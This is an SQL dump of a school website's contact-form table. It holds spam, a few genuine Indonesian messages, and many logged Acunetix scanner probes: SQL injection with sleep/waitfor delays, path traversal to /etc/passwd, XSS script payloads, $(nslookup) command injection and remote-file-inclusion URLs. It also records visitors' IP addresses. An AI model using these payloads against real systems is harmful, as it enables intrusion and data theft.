INSERT INTO `tb_contact` VALUES (348, 'nurmwjbewBJ nuowepbewBJ', 'nurmwjbewBJ', 'where to buy viagra online', 'quick payday loans <a href=\"http://paydayloans2017.com\"> payday loans direct lenders only</a> &lt;a href=&quot;http://paydayloans2017.com&quot;&gt; online payday loans no credit check&lt;/a&gt; <a href=http://paydayloans2017.com>instant payday loans</a>  fast auto and payday loans', '46.161.9.3', '0000-00-00');
INSERT INTO `tb_contact` VALUES (349, 'fcfwgkFomoCkq mRYmaNdPvrs', 'fcfwgkFomoCkq', 'gyfOYDWfAdfwXuijfkQ', 'AdHEr9  <a href=\"http://rrxtwgcotvyn.com/\">rrxtwgcotvyn</a>, [url=http://ugrbqutoycet.com/]ugrbqutoycet[/url], [link=http://nroqzrjytwwv.com/]nroqzrjytwwv[/link], http://cceqkenucgbb.com/', '46.161.9.59', '0000-00-00');
INSERT INTO `tb_contact` VALUES (350, 'nhpkvtbewBJ ntmnbvbewBJ', 'nhpkvtbewBJ', 'payday advance loans', 'online payday loans direct lenders <a href=\"http://paydayloans2017.com\"> payday loans</a> &lt;a href=&quot;http://paydayloans2017.com&quot;&gt; payday loan&lt;/a&gt; http://paydayloans2017.com - payday loans mn  direct payday loan lenders', '46.161.9.3', '0000-00-00');
INSERT INTO `tb_contact` VALUES (351, 'khamidah khamidah', 'khamidah', 'permohonan izin mengetahui struktur organisasi dari SMK N 1 Jenangan', 'Assalamualaikum , moho maaf sebelumnya ini dari saya khamidah yang pernah memohon izin dari untuk melakukan penelitian di STMJ, \r\nMengenai struktur organisasi sekolah saya sudah pernah menghubungi dan disarankan untuk mengambil dari website resmi di Smkn1jenpo.sch.id tapi saya belum bisa menemukan, \r\ndengan datangnya pesan ini , mohon diperkenankan mengambil data tersebut, trimakasih.', '118.97.238.1', '0000-00-00');
INSERT INTO `tb_contact` VALUES (352, 'khamidah khamidah', 'khamidah', 'permohonan izin mengetahui struktur organisasi dari SMK N 1 Jenangan', 'Assalamualaikum , moho maaf sebelumnya ini dari saya khamidah yang pernah memohon izin dari untuk melakukan penelitian di STMJ, \r\nMengenai struktur organisasi sekolah saya sudah pernah menghubungi dan disarankan untuk mengambil dari website resmi di Smkn1jenpo.sch.id tapi saya belum bisa menemukan, \r\ndengan datangnya pesan ini , mohon diperkenankan mengambil data tersebut, trimakasih.', '118.97.238.1', '0000-00-00');
INSERT INTO `tb_contact` VALUES (353, 'Acunetix rjdnrppe', 'Acunetix', '1', '1', '180.254.64.191', '0000-00-00');
INSERT INTO `tb_contact` VALUES (354, 'Acunetix pgmluwwy', 'Acunetix', '1', '1', '180.254.64.191', '0000-00-00');
INSERT INTO `tb_contact` VALUES (355, 'Acunetix kckytmku', 'Acunetix', '1', '1', '180.254.64.191', '0000-00-00');
INSERT INTO `tb_contact` VALUES (356, 'Acunetix kckytmku', 'Acunetix', '1', '1', '180.254.64.191', '0000-00-00');
INSERT INTO `tb_contact` VALUES (357, 'response.write(9830563*9223668) kckytmku', 'response.write(9830563*9223668)', '1', '1', '180.254.64.191', '0000-00-00');
INSERT INTO `tb_contact` VALUES (358, 'Acunetix pgmluwwy', 'Acunetix', '1', '1', '180.254.64.191', '0000-00-00');
INSERT INTO `tb_contact` VALUES (359, 'Acunetix axnhemkv', 'Acunetix', '1', '1', '180.254.64.191', '0000-00-00');
INSERT INTO `tb_contact` VALUES (360, 'Acunetix&n930505=v926093 goaxftme', 'Acunetix&n930505=v926093', '1', '1', '180.254.64.191', '0000-00-00');
INSERT INTO `tb_contact` VALUES (361, 'Acunetix birehrbw', 'Acunetix', '1', '$(nslookup tNq6Wg5T)', '180.254.64.191', '0000-00-00');
INSERT INTO `tb_contact` VALUES (362, 'Acunetix birehrbw', 'Acunetix', '1', '1', '180.254.64.191', '0000-00-00');
INSERT INTO `tb_contact` VALUES (363, 'Acunetix pgmluwwy', 'Acunetix', 'nHxjcRDV\');select pg_sleep(9); --', '1', '180.254.64.191', '0000-00-00');
INSERT INTO `tb_contact` VALUES (364, 'Acunetix rjdnrppe', 'Acunetix', '1', '1', '180.254.64.191', '0000-00-00');
INSERT INTO `tb_contact` VALUES (365, 'Acunetix pjvylrks', 'Acunetix', '1', '1', '180.254.64.191', '0000-00-00');
INSERT INTO `tb_contact` VALUES (366, '1acuO1h5n6ARO0 pjvylrks', '1acuO1h5n6ARO0', '1', '1', '180.254.64.191', '0000-00-00');
INSERT INTO `tb_contact` VALUES (367, 'Acunetix 1acuqGt5m3Vw2M', 'Acunetix', '1', '1', '180.254.64.191', '0000-00-00');
INSERT INTO `tb_contact` VALUES (368, 'Acunetix pjvylrks', 'Acunetix', '1', '1acuZiWIhSqPix', '180.254.64.191', '0000-00-00');
INSERT INTO `tb_contact` VALUES (369, 'Acunetix pjvylrks', 'Acunetix', '1', '1', '180.254.64.191', '0000-00-00');
INSERT INTO `tb_contact` VALUES (370, 'Acunetix pjvylrks', 'Acunetix', '1acutxFADQdWKl', '1', '180.254.64.191', '0000-00-00');
INSERT INTO `tb_contact` VALUES (371, 'Acunetix rqswvmdp', 'Acunetix', '1', '1', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (372, 'Acunetix tdrdbsap', 'Acunetix', '1', '1', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (373, 'Acunetix atklwypu', 'Acunetix', '1', '1', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (374, 'Acunetix ubxiyptk', 'Acunetix', '1', '1', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (375, 'Acunetix drhgmaok', 'Acunetix', '1', '1', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (376, 'Acunetix tjjyghtr', 'Acunetix', '1', '1', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (377, 'Acunetix drhgmaok', 'Acunetix', '1', '1', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (378, '\"+response.write(9503862*9370909)+\" tdrdbsap', '\"+response.write(9503862*9370909)+\"', '1', '1', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (379, 'Acunetix nohrjaaf', 'Acunetix', '1', '1', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (380, 'Acunetix ${99134+99431}', 'Acunetix', '1', '1', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (381, 'Acunetix response.write(9063654*9280001)', 'Acunetix', '1', '1', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (382, 'Acunetix \'+response.write(9063654*9280001)+\'', 'Acunetix', '1', '1', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (383, 'Acunetix \"+response.write(9063654*9280001)+\"', 'Acunetix', '1', '1', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (384, 'Acunetix tdrdbsap', 'Acunetix', '1', 'response.write(9089560*9287974)', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (385, 'Acunetix tjjyghtr', 'Acunetix', '1', 'LnnZzx5X\')); waitfor delay \'0:0:3\' --', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (386, 'Acunetix tjjyghtr', 'Acunetix', '1', '-1;select pg_sleep(3); --', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (387, 'Acunetix ../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd', 'Acunetix', '1', '1', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (388, 'Acunetix ../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd', 'Acunetix', '1', '1', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (389, 'Acunetix ................etc/passwd', 'Acunetix', '1', '1', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (390, 'Acunetix wiimmyai', 'Acunetix', '1', 'save', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (391, 'Acunetix jtovktwp', 'Acunetix', '1', '1', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (392, 'Acunetix invalid../../../../../../../../../../etc/passwd/./././././././././././././././././././././.', 'Acunetix', '1', '1', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (393, 'Acunetix tonthayt', 'Acunetix', '1', '1', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (394, 'Acunetix wvacdsnk', 'Acunetix', '<!--', '1', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (395, 'Acunetix amditxey\'\"()&%<ScRiPt >prompt(977474)</ScRiPt>', 'Acunetix', '1', '1', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (396, 'Acunetix tonthayt', 'Acunetix', '1', '1', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (397, 'Acunetix tonthayt', 'Acunetix', '1', '1', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (398, 'Acunetix \'\"()&%<ScRiPt >prompt(930385)</ScRiPt>', 'Acunetix', '1', '1', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (399, 'Acunetix tjjyghtr', 'Acunetix', '1', '1', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (400, 'Acunetix amditxey_994061', 'Acunetix', '1', '1', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (401, 'Acunetix aeirxuwq', 'Acunetix', '1', 'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAucG5n', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (402, 'Acunetix aeirxuwq', 'Acunetix', '1', '.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./etc/passwd', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (403, 'Acunetix aeirxuwq', 'Acunetix', '1', '/etc/passwd', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (404, 'Acunetix aeirxuwq', 'Acunetix', '1', '................etc/passwd', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (405, 'Acunetix tjjyghtr', 'Acunetix', '-1 OR 2+339-339-1=0+0+0+1', '1', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (406, 'Acunetix tjjyghtr', 'Acunetix', '-1 OR 3+339-339-1=0+0+0+1', '1', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (407, 'Acunetix tonthayt', 'Acunetix', '1', '(select convert(int,CHAR(65)))', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (408, 'Acunetix tjjyghtr', 'Acunetix', '(select(0)from(select(sleep(6)))v)/*\'+(select(0)from(select(sleep(6)))v)+\'\"+(select(0)from(select(sl', '1', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (409, 'Acunetix aeirxuwq', 'Acunetix', '1', '1', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (410, 'Acunetix tjjyghtr', 'Acunetix', 'cq9nSVkh\'; waitfor delay \'0:0:9\' --', '1', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (411, 'Acunetix aeirxuwq', 'Acunetix', '1', '1', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (412, 'Acunetix tjjyghtr', 'Acunetix', 'deCainZg\')); waitfor delay \'0:0:9\' --', '1', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (413, 'Acunetix tonthayt', 'Acunetix', '1\'\"', '1', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (414, 'Acunetix aeirxuwq', 'Acunetix', '1', '1', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (415, 'Acunetix aeirxuwq', 'Acunetix', '../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd', '1', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (416, '1acuqp1oyUe4ol 1acujSrDamrQPC', '1acuqp1oyUe4ol', '1acuKrcvWYMuSy', '1acuktLOW5TN0D', '36.82.101.73', '0000-00-00');
INSERT INTO `tb_contact` VALUES (417, 'Nanda Adi Stefani', 'Nanda Adi', 'Website', 'Website STNj kok jarang di Update ya min ? tolong di update, biar bagus terimakasih', '103.235.153.68', '0000-00-00');
INSERT INTO `tb_contact` VALUES (418, 'Acunetix imptfigt', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (419, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (420, 'Acunetix qfxidtrm', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (421, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (422, 'Acunetix hkwhfhrq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (423, 'Acunetix rtkdypyo', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (424, 'Acunetix qfxidtrm', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (425, 'Acunetix rtkdypyo', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (426, 'Acunetix qfxidtrm', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (427, 'Acunetix hkwhfhrq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (428, 'Acunetix rtkdypyo', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (429, 'SomeCustomInjectedHeader:injected_by_wvs qfxidtrm', 'SomeCustomInjectedHeader:injected_by_wvs', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (430, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (431, 'SomeCustomInjectedHeader:injected_by_wvs qfxidtrm', 'SomeCustomInjectedHeader:injected_by_wvs', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (432, 'Acunetix hkwhfhrq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (433, 'Acunetix rtkdypyo', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (434, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (435, 'SomeCustomInjectedHeader:injected_by_wvs qfxidtrm', 'SomeCustomInjectedHeader:injected_by_wvs', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (436, 'Acunetix hkwhfhrq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (437, 'Acunetix rtkdypyo', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (438, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (439, 'Acunetix qfxidtrm', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (440, 'Acunetix idgmcxlt', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (441, 'Acunetix qfxidtrm', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (442, '${100038+99619} idgmcxlt', '${100038+99619}', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (443, '12345\'\"\\\'\\\");|]*{\r\n<>\'\' rtkdypyo', '12345\'\"\\\'\\\");|]*{\r\n<>\'\'', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (444, 'Acunetix qfxidtrm', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (445, 'Acunetix frduhgsu', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (446, 'Acunetix idgmcxlt', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (447, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (448, 'Acunetix hkwhfhrq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (449, 'Acunetix SomeCustomInjectedHeader:injected_by_wvs', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (450, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (451, 'Acunetix hkwhfhrq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (452, 'Acunetix SomeCustomInjectedHeader:injected_by_wvs', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (453, 'Acunetix rtkdypyo', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (454, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (455, 'TlFGVnZVRkY= rkdgtvue', 'TlFGVnZVRkY=', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (456, 'Acunetix SomeCustomInjectedHeader:injected_by_wvs', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (457, 'Acunetix hkwhfhrq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (458, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (459, 'Acunetix frduhgsu', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (460, 'Acunetix ${99174+100256}', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (461, 'Acunetix rkdgtvue', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (462, 'Acunetix qfxidtrm', 'Acunetix', '1', 'SomeCustomInjectedHeader:injected_by_wvs', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (463, 'Acunetix hkwhfhrq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (464, 'Acunetix rtkdypyo', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (465, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (466, 'Acunetix frduhgsu', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (467, 'Acunetix UjV1Tm9reUQ=', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (468, 'Acunetix qfxidtrm', 'Acunetix', '1', 'SomeCustomInjectedHeader:injected_by_wvs', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (469, 'Acunetix hkwhfhrq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (470, 'Acunetix rtkdypyo', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (471, 'Acunetix cjfxbnmp', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (472, 'Acunetix idgmcxlt', 'Acunetix', '1', '${99850+99646}', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (473, 'Acunetix qfxidtrm', 'Acunetix', '1', 'SomeCustomInjectedHeader:injected_by_wvs', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (474, 'Acunetix hkwhfhrq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (475, 'Acunetix oiuaufwk', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (476, 'Acunetix rtkdypyo', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (477, 'Acunetix idgmcxlt', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (478, 'Acunetix hkwhfhrq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (479, 'Acunetix frduhgsu', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (480, 'Acunetix rtkdypyo', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (481, 'Acunetix&n987840=v923945 kodpxrdf', 'Acunetix&n987840=v923945', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (482, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (483, 'Acunetix qfxidtrm', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (484, 'Acunetix frduhgsu', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (485, 'Acunetix qfxidtrm', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (486, 'http://some-inexistent-website.acu/some_inexistent_file_with_long_name?.jpg frduhgsu', 'http://some-inexistent-website.acu/some_inexistent_file_with_long_name?.jpg', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (487, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (488, 'Acunetix qfxidtrm', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (489, 'Acunetix cjfxbnmp', 'Acunetix', '\'set|set&set\'', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (490, 'Acunetix 12345\'\"\\\'\\\");|]*{\r\n<>\'\'', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (491, 'Acunetix vptyywnf', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (492, 'Acunetix hkwhfhrq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (493, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (494, 'Http://testasp.vulnweb.com/t/fit.txt frduhgsu', 'Http://testasp.vulnweb.com/t/fit.txt', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (495, 'Acunetix hkwhfhrq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (496, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (497, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (498, 'Acunetix qfxidtrm', 'Acunetix', 'SomeCustomInjectedHeader:injected_by_wvs', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (499, '-1 OR 2+652-652-1=0+0+0+1 -- jpkqpyml', '-1 OR 2+652-652-1=0+0+0+1 --', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (500, 'Acunetix qfxidtrm', 'Acunetix', 'SomeCustomInjectedHeader:injected_by_wvs', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (501, 'Acunetix qfxidtrm', 'Acunetix', 'SomeCustomInjectedHeader:injected_by_wvs', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (502, 'Acunetix http://some-inexistent-website.acu/some_inexistent_file_with_long_name?.jpg', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (503, '/etc/passwd hkwhfhrq', '/etc/passwd', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (504, 'Acunetix ddyafxkp&n927997=v942403', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (505, '-1 OR 3+201-201-1=0+0+0+1 jpkqpyml', '-1 OR 3+201-201-1=0+0+0+1', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (506, '-1 OR 3*2<(0+5+201-201) jpkqpyml', '-1 OR 3*2<(0+5+201-201)', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (507, 'Acunetix rtkdypyo', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (508, '../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd hkwhfhrq', '../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (509, 'Acunetix http://testasp.vulnweb.com/t/fit.txt?.jpg', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (510, 'Acunetix sajxxekr', 'Acunetix', '1', '1&n933051=v940883', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (511, '................etc/passwd hkwhfhrq', '................etc/passwd', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (512, 'Acunetix idgmcxlt', 'Acunetix', '${100074+99833}', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (513, 'Acunetix tgolgaej', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (514, 'Acunetix cdrqeuat', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (515, 'invalid../../../../../../../../../../etc/passwd/././././././././././././././././././././././././././', 'invalid../../../../../../../../../../etc/passwd/././././././././././././././././././././././././././', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (516, 'Acunetix cjfxbnmp', 'Acunetix', '`set|set&set`', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (517, 'Acunetix tuvkwrso', 'Acunetix', '1&n949978=v988197', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (518, 'file:///etc/passwd hkwhfhrq', 'file:///etc/passwd', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (519, 'Acunetix testasp.vulnweb.com', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (520, 'Acunetix cdrqeuat', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (521, '/\\../\\../\\../\\../\\../\\../\\../etc/passwd hkwhfhrq', '/\\../\\../\\../\\../\\../\\../\\../etc/passwd', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (522, 'WEB-INF/web.xml hkwhfhrq', 'WEB-INF/web.xml', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (523, 'Acunetix budrowvm', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (524, 'WEB-INF\\web.xml hkwhfhrq', 'WEB-INF\\web.xml', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (525, 'Acunetix hkwhfhrq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (526, 'Acunetix wwkkomuf', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (527, '\'\"() cdrqeuat', '\'\"()', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (528, 'Acunetix hkwhfhrq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (529, ';print(md5(acunetix_wvs_security_test)); wwkkomuf', ';print(md5(acunetix_wvs_security_test));', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (530, 'http://testasp.vulnweb.com/t/xss.html?%00.jpg budrowvm', 'http://testasp.vulnweb.com/t/xss.html?%00.jpg', '1', '1', '110.136.26.106', '0000-00-00');
